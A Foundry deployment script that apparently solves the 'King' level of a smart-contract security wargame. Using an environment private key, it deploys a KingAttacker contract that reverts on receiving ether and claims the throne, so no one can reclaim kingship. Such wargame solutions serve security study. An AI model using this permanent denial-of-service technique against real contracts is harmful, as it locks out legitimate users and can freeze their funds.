// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/09-King/KingAttacker.sol";

/**
 * @title Challenge 09 Solution Script
 * @notice Deploy KingAttacker that reverts on receive(), making king permanent
 */
contract KingSolution is Script {
    address constant INSTANCE = 0xc6f44D0372cC16Af05DedFBeF8Af27F3b7A9A845;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployerPrivateKey);

        // Deploy attacker and become king by sending >= prize amount
        KingAttacker attacker = new KingAttacker(payable(INSTANCE));
        attacker.changeKing{value: 0.001 ether}();
        console.log("KingAttacker deployed and became king at:", address(attacker));

        vm.stopBroadcast();

        console.log("Challenge 09 completed! No one can reclaim kingship.");
    }
}
